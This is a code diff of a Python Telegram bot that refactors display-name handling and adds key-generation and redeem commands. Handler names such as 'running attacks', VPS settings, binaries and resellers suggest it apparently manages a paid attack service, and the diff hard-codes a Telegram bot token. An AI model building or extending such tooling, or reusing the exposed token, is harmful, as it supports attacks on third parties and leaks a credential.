-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+        current_display_name = get_display_name_from_update(update)
         
         await update.message.reply_text(
             f"🏠 *Returned to main menu*\n\n",
@@ -2514,7 +2676,7 @@ async def reseller_status_start(update: Update, context: CallbackContext):
         await update.message.reply_text("❌ *Only owner or co-owners can check reseller status!*", parse_mode='Markdown')
         return ConversationHandler.END
     
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     
     await update.message.reply_text(
         f"⚠️ *Enter reseller's username or ID to check status:*\n\n",
@@ -2565,7 +2727,7 @@ async def reseller_status_info(update: Update, context: CallbackContext):
         # Escape username for Markdown
         username = escape_markdown(user.username, version=2) if user.username else 'N/A'
         
-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+        current_display_name = get_display_name_from_update(update)
         
         message_text = (
             f"📊 *Reseller Status*\n\n"
@@ -2596,12 +2758,21 @@ async def reseller_status_info(update: Update, context: CallbackContext):
     
     return MENU_SELECTION
 
+
+def get_display_name_from_update(update):
+    user = update.effective_user
+    if user:
+        return user.full_name or user.username or str(user.id)
+    return "Unknown"
+
+
+
 async def add_co_owner_start(update: Update, context: CallbackContext):
     if not is_owner(update):
         await update.message.reply_text("❌ *Only the owner can add co-owners!*", parse_mode='Markdown')
         return ConversationHandler.END
 
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     
     await update.message.reply_text(
         f"⚠️ *Enter the user ID of the co-owner to add.*\n\n",
@@ -2616,7 +2787,7 @@ async def add_co_owner_input(update: Update, context: CallbackContext):
         user_id = int(user_id_str)
         if user_id not in CO_OWNERS:
             CO_OWNERS.append(user_id)
-            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+            current_display_name = get_display_name_from_update(update)
             
             await update.message.reply_text(
                 f"✅ *Co-owner with ID {user_id} added successfully!*\n\n"
@@ -2624,7 +2795,7 @@ async def add_co_owner_input(update: Update, context: CallbackContext):
                 parse_mode='Markdown'
             )
         else:
-            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+            current_display_name = get_display_name_from_update(update)
             
             await update.message.reply_text(
                 f"ℹ️ *User ID {user_id} is already a co-owner.*\n\n",
@@ -2645,7 +2816,7 @@ async def remove_co_owner_start(update: Update, context: CallbackContext):
         await update.message.reply_text("❌ *There are no co-owners to remove!*", parse_mode='Markdown')
         return ConversationHandler.END
 
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     
     await update.message.reply_text(
         f"⚠️ *Enter the user ID of the co-owner to remove.*\n\n"
@@ -2661,7 +2832,7 @@ async def remove_co_owner_input(update: Update, context: CallbackContext):
         user_id = int(user_id_str)
         if user_id in CO_OWNERS:
             CO_OWNERS.remove(user_id)
-            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+            current_display_name = get_display_name_from_update(update)
             
             await update.message.reply_text(
                 f"✅ *Co-owner with ID {user_id} removed successfully!*\n\n"
@@ -2669,7 +2840,7 @@ async def remove_co_owner_input(update: Update, context: CallbackContext):
                 parse_mode='Markdown'
             )
         else:
-            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+            current_display_name = get_display_name_from_update(update)
             
             await update.message.reply_text(
                 f"❌ *User ID {user_id} is not a co-owner!*\n\n",
@@ -2750,7 +2921,7 @@ async def set_display_name_input(update: Update, context: CallbackContext):
         return ConversationHandler.END
 
 async def show_uptime(update: Update, context: CallbackContext):
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     uptime = get_uptime()
     
     await update.message.reply_text(
@@ -2763,7 +2934,7 @@ async def settings_menu(update: Update, context: CallbackContext):
         await update.message.reply_text("❌ *Only owner or co-owners can access settings!*", parse_mode='Markdown')
         return
     
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     
     await update.message.reply_text(
         f"⚙️ *Settings Menu*\n\n",
@@ -2909,7 +3080,7 @@ async def handle_button_click(update: Update, context: CallbackContext):
         await stop_selected_bot(update, context)
 
 async def cancel_conversation(update: Update, context: CallbackContext):
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     
     await update.message.reply_text(
         "❌ *Current process canceled.*\n\n"
@@ -3280,6 +3451,8 @@ def main():
     application.add_handler(start_bot_handler)
     application.add_handler(broadcast_handler)
     application.add_handler(stop_bot_handler)
+    application.add_handler(CommandHandler("code", manual_key_generation))
+    application.add_handler(CommandHandler("redeem", redeem_key_manual))
     application.add_handler(delete_binary_handler)
     application.add_handler(set_vps_handler)
     application.add_handler(CommandHandler("running", show_running_attacks))
@@ -3297,6 +3470,18 @@ def main():
     job_queue.run_repeating(check_expired_keys, interval=3600, first=10)  # Check every hour
 
     application.run_polling()
+import asyncio
+
+import asyncio
+
+try:
+    app_event_loop = asyncio.get_running_loop()
+except RuntimeError:
+    app_event_loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(app_event_loop)
+
+application = Application.builder().token("8133767092:AAGXXhLvad9X9PvJb1vMUhxvXWGOUMvGNoY").build()
+
 
 if __name__ == '__main__':
     main()
